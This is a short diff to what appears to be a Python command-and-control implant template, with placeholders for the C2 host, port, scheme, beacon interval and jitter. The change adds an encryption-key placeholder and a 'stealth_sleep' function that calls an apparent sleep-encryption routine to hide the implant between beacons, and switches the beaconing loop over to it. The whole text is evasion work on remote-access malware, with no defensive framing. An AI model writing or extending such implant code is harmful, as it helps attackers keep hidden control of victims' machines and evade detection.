@@ -18,6 +18,7 @@ SERVER_PORT = {{C2_PORT}}
 C2_SCHEME = "{{C2_SCHEME}}"
 BEACON_INTERVAL = {{BEACON_INTERVAL}}
 BEACON_JITTER = {{BEACON_JITTER}}
+ENCRYPTION_KEY = b"{{ENCRYPTION_KEY}}"
 VERIFY_SSL = {{VERIFY_SSL}}
 
 BASE_URL = f"{C2_SCHEME}://{SERVER_HOST}:{SERVER_PORT}"
@@ -32,6 +33,14 @@ def simple_encrypt(data: str) -> str:
 
 def simple_decrypt(data: str) -> str:
     return wire_decrypt(data)
+
+def stealth_sleep(seconds):
+    secret = bytearray(ENCRYPTION_KEY)
+    try:
+        globals()['sleep_encrypt'](seconds, secret)
+        return
+    except Exception:
+        sleep_mask(seconds)
 
 def sleep_mask(seconds):
     import os
@@ -209,7 +218,7 @@ def connect_to_server():
                             })
 
             sleep_time = calculate_sleep_time(beacon_interval, beacon_jitter)
-            sleep_mask(sleep_time)
+            stealth_sleep(sleep_time)
 
         except Exception:
             time.sleep(5)
